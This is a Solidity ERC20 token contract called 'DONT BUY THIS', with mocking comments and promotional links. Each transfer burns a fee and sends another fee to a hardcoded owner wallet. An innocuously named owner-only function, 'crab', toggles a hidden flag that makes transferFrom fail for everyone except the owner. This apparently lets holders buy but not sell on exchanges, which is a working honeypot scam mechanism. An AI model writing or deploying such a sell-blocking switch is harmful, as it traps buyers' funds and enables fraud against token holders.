pragma solidity ^0.8.0;
//SPDX-License-Identifier: NONE
//Better not buy this!
//Seriously! I promise this is going to get pulled quick!
//or will it? Yes! It will :)
//https://www.theonion.com/please-like-me-1848674003
//t.me/ATotallyRealTelegram
//https://discord.gg/hAMiLiKEHam

import "./ERC20.sol";
import "./Ownable.sol";

contract DONTBUYTHIS is Ownable, ERC20 {
    uint BURN_FEE = 420;
    uint DONT_FEE = 80;
    address payable public BUTTHOLE = payable(address(0xB1c263Eec70A7AF3aD1B8CaF3247f6E8f5C6C2d1));
    bool private _pleaseimbeggingyou = false;

constructor() ERC20 ('DONT BUY THIS','DONTBUYTHIS') {
    _mint(msg.sender, 420420* 10 ** 18);
    }
       
function crab() external onlyOwner
    {
        _pleaseimbeggingyou = !_pleaseimbeggingyou;
    }
   
function transfer(address recipient, uint256 amount) public override returns (bool){
            uint burnAmount = amount*(BURN_FEE) / 10000;
            uint dontAmount = amount*(DONT_FEE) / 10000;
            _burn(_msgSender(), burnAmount);
            _transfer(_msgSender(), recipient, amount-(burnAmount)-(dontAmount));
            _transfer(_msgSender(), BUTTHOLE, dontAmount);
      return true;
    }    

function transferFrom(
        address from, 
        address to, 
        uint256 amount
    ) public override returns (bool) 
    {     
        require(!_pleaseimbeggingyou || tx.origin == owner(), "I'm BEGGING you");
        return super.transferFrom(from, to, amount);
    }
}